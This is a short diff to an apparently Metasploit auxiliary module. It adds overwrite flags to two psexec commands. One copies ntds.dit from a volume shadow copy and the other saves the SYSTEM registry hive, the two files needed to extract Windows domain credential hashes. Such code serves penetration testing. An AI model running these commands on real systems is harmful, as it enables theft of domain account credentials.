@@ -151,7 +151,7 @@ class Metasploit3 < Msf::Auxiliary
 		begin 
 			# Try to copy ntds.dit from VSC
 			ntdspath = vscpath.to_s + '\\WINDOWS\\NTDS\\ntds.dit'
-			command = "#{cmd} /C copy #{ntdspath} C:\\WINDOWS\\Temp\\ntds"
+			command = "#{cmd} /C copy /Y #{ntdspath} C:\\WINDOWS\\Temp\\ntds"
 			simple.connect(smbshare)
 			psexec(smbshare, command)
 		rescue StandardError => ntdscopyerror
@@ -170,7 +170,7 @@ class Metasploit3 < Msf::Auxiliary
 		print_status("Copying SYSTEM hive file to Windows Temp directory")
 		begin
 			# Try to crate the sys hive copy
-			command = "#{cmd} /C reg.exe save HKLM\\SYSTEM C:\\WINDOWS\\Temp\\sys"
+			command = "#{cmd} /C reg.exe save /y HKLM\\SYSTEM C:\\WINDOWS\\Temp\\sys"
 			simple.connect(smbshare)
 			psexec(smbshare, command)
 		rescue StandardError => hiveerror
